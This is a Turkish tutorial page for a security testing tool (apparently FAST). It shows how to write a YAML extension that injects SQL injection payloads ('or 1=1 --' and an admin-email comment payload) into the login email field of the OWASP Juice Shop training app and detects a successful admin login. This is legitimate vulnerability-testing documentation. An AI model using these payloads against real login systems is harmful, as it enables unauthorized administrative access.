[link-app-examination]:     app-examination.md
[link-points]:              ../points/intro.md
[link-using-extension]:     ../using-extension.md
[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section

[doc-collect-phase]:        ../phase-collect.md
[doc-match-phase]:          ../phase-match.md
[doc-modify-phase]:         ../phase-modify.md
[doc-generate-phase]:       ../phase-generate.md
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project

#   Modifiye Edici Uzantının Oluşturulması

Bu belgede açıklanan uzantı, gelen temel isteği modifiye ederek içine payload enjeksiyonu yapacaktır. Bu payloadlar, [“OWASP Juice Shop”][link-juice-shop] hedef uygulamasının giriş formundaki SQLi açığının istismarına yol açabilir.
  
##  Hazırlıklar

FAST uzantısı oluşturmadan önce şu adımları atmanız şiddetle tavsiye edilir:
1.  Uzantıyı oluşturduğunuz [hedef uygulamanın davranışını inceleyin][link-app-examination].
2.  Uzantı için [nokta oluşturma ilkelerini okuyun][link-points].


##  Uzantının Oluşturulması

Uzantıyı tanımlayan bir dosya oluşturun (ör. `mod-extension.yaml`) ve gerekli bölümleri ekleyin:

1.  [**`meta-info` bölümü**][link-meta-info].

    Uzantının tespit etmeye çalışacağı açığın açıklamasını hazırlayın.
    
    * açık başlığı: `OWASP Juice Shop SQLi (mod extension)`
    * açığın açıklaması: `Demo of SQLi in OWASP Juice Shop (Admin Login)`
    * açık tipi: SQL injection
    * açığın tehdit seviyesi: yüksek
    
    İlgili `meta-info` bölümü aşağıdaki gibi görünmelidir:
    
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
    ```
    
2.  **`collect` bölümü, [Collect aşaması][doc-collect-phase]**.
    
    Giriş yapmaya çalışırken REST API `POST /rest/user/login` metodu çağrılır.
    
    API’ye gönderilmiş her bir temel giriş isteği için ayrı test isteği oluşturmanıza gerek yoktur; zira güvenlik açığı testleri, POST isteğinde iletilen her bir veri parçası için aynı şekilde gerçekleştirilecektir.
    
    Uzantının, API giriş isteğini aldığında yalnızca bir kez çalışacak şekilde yapılandırılmasını sağlayın. Bunu yapmak için, uzantıya benzersizlik koşulu içeren Collect aşamasını ekleyin.

    `/rest/user/login` API giriş isteği şu bileşenlerden oluşur:

    1.  Yolun ilk kısmı: `rest`
    2.  Yolun ikinci kısmı: `user`
    3.  `login` eylem metodu
    
    Bu değerlere karşılık gelen noktalar aşağıdaki gibidir:

    1.  Yolun ilk kısmı için: `PATH_0_value`
    2.  Yolun ikinci kısmı için: `PATH_1_value`
    3.  `login` eylem metodu için: `ACTION_NAME_value`
    
    Bu üç öğenin kombinasyonunun benzersiz olması koşulunu eklerseniz, uzantı API’ye gönderilen ilk `/rest/user/login` temel isteğinde çalışacaktır (bu istek benzersiz kabul edilecek ve sonraki giriş istekleri benzersiz olmayacaktır). 
    
    İlgili `collect` bölümünü uzantı YAML dosyasına ekleyin. 
    
    ```
    collect:
      - uniq:
        - [PATH_0_value, PATH_1_value, ACTION_NAME_value]
    ```

3.  **`match` bölümü, [Match aşaması][doc-match-phase]**.
    
    Gelen temel isteğin gerçekten API’ye giriş isteği olup olmadığını kontrol etmek gereklidir, çünkü oluşturduğumuz uzantı, giriş formundaki güvenlik açıklarını istismar edecektir.
    
    Uzantının, yalnızca temel isteğin hedefi aşağıdaki URI ise çalışacak şekilde yapılandırılmasını sağlayın: `/rest/user/login`. Alınan isteğin gerekli öğeleri içerip içermediğini kontrol eden Match aşamasını ekleyin. Bu, aşağıdaki `match` bölümü ile yapılabilir:

    ```
    match:
      - PATH_0_value: 'rest'
      - PATH_1_value: 'user'
      - ACTION_NAME_value: 'login'
    ```

4.  **`modify` bölümü, [Modify aşaması][doc-modify-phase]**.
    
    Temel isteği aşağıdaki hedeflere ulaşacak şekilde modifiye etmeniz gerektiğini varsayalım:
    * `Accept-Language` HTTP başlık değerini temizlemek (bu değer açığın tespit edilmesi için gerekli değildir).
    * `email` ve `password` parametrelerinin gerçek değerlerinin yerine nötr `dummy` değerlerini koymak.
    
    Aşağıda açıklanan hedeflere ulaşmak için isteği değiştiren `modify` bölümünü uzantıya ekleyin:
    
    ```
    modify:
      - "HEADER_ACCEPT-LANGUAGE_value": ""
      - "POST_JSON_DOC_HASH_email_value": "dummy"
      - "POST_JSON_DOC_HASH_password_value": "dummy"
    ```
    
    !!! info "İstek öğelerinin açıklama sözdizimi"
        JSON formatındaki istek verisi, `<anahtar: değer>` çiftleri halinde saklandığından, `email` öğesini belirten nokta yukarıda gösterildiği gibi görünür. `password` öğesini belirten nokta da benzer bir yapıya sahiptir.
        
        Noktaların nasıl oluşturulduğuna dair detaylı bilgi için [bu linke][link-points] bakın.
 
5.  **`generate` bölümü, [Generate aşaması][doc-generate-phase]**.

    Hedef uygulamadaki SQL enjeksiyon açığını istismar etmek için temel istekteki `email` parametresinin değerini değiştirmesi gereken iki payload olduğu bilinmektedir:
    * `'or 1=1 --`
    * `admin@juice-sh.op'--`
        
    !!! info "Modifiye edilmiş isteğe payload eklenmesi"
        Payload, uzantının `modify` bölümünü içermesi nedeniyle, daha önceden modifiye edilmiş isteğe eklenecektir. Böylece `email` alanına ilk payload eklendikten sonra test isteği verisi aşağıdaki gibi görünmelidir:
    
        ```
        {
            "email": "'or 1=1 --",
            "password":"dummy"
        }
        ```
    
        Seçilen payloadlar nedeniyle herhangi bir şifre ile başarılı şekilde giriş yapılabildiğinden, `password` alanına payload eklenmesine gerek yoktur; çünkü Modify aşamasından sonra bu alan `dummy` değerini alacaktır.
    
        Yukarıda tartışılan gereksinimleri karşılayan test isteklerini oluşturacak `generate` bölümünü ekleyin.
    
        ```
        generate:
          - payload:
            - "'or 1=1 --"
            - "admin@juice-sh.op'--"
          - into: "POST_JSON_DOC_HASH_email_value"
          - method:
            - replace
        ```

6.  **`detect` bölümü, [Detect aşaması][doc-detect-phase]**.
    
    Aşağıdaki koşullar, yönetici haklarıyla yapılan kullanıcı doğrulamasının başarılı olduğunu göstermektedir:
    * Cevap gövdesinde, `1` değeriyle bulunan alışveriş sepeti tanımlayıcı parametresinin varlığı. Parametre JSON formatındadır ve aşağıdaki gibi görünmelidir:
    
        ```
        "bid":1
        ```
    
    * Cevap gövdesinde, `admin@juice-sh.op` değeriyle bulunan kullanıcı email parametresinin varlığı. Parametre JSON formatındadır ve aşağıdaki gibi görünmelidir:
    
        ```
         "umail":"admin@juice-sh.op"
        ```
    
    Saldırının yukarıda açıklanan koşullara göre başarılı olup olmadığını kontrol eden `detect` bölümünü ekleyin.
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```
    
!!! info "Özel sembollerin kaçırılması"
    Dizelerdeki özel sembollerin doğru şekilde kaçırıldığından emin olun.

##  Uzantı Dosyası

Artık `mod-extension.yaml` dosyası, uzantının çalışması için gerekli tüm bölümleri içermektedir. Dosya içeriğinin listesi aşağıdadır:

??? info "mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'

    collect:
      - uniq:
        - [PATH_0_value, PATH_1_value, ACTION_NAME_value]

    match:
      - PATH_0_value: 'rest'
      - PATH_1_value: 'user'
      - ACTION_NAME_value: 'login'

    modify:
      - "HEADER_ACCEPT-LANGUAGE_value": ""
      - "POST_JSON_DOC_HASH_email_value": "dummy"
      - "POST_JSON_DOC_HASH_password_value": "dummy"

    generate:
      - payload:
        - "'or 1=1 --"
        - "admin@juice-sh.op'--"
      - into: "POST_JSON_DOC_HASH_email_value"
      - method:
        - replace

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

##  Uzantıyı Kullanma

Oluşturulan uzantının nasıl kullanılacağına dair ayrıntılı bilgi için [bu dokümana][link-using-extension] bakın.